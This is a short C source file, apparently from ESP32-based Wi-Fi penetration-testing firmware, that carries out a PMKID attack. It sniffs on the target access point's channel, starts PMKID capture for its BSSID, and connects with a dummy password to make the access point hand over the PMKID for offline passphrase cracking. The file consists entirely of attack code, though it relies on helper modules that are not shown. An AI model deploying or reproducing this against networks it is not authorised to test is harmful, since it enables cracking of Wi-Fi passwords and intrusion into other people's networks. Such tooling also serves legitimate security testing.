#include "attack_pmkid.h"

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"

#include "attack.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"

static const char* TAG = "attack_pmkid";

void attack_pmkid(attack_config_t *attack_config){
    ESP_LOGI(TAG, "Attack on PMKID...");
    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_start(attack_config->ap_record->primary);
    frame_analyzer_capture_pmkid(attack_config->ap_record->bssid);
    wifictl_connect_sta_to_ap(attack_config->ap_record, "dummypassword");
}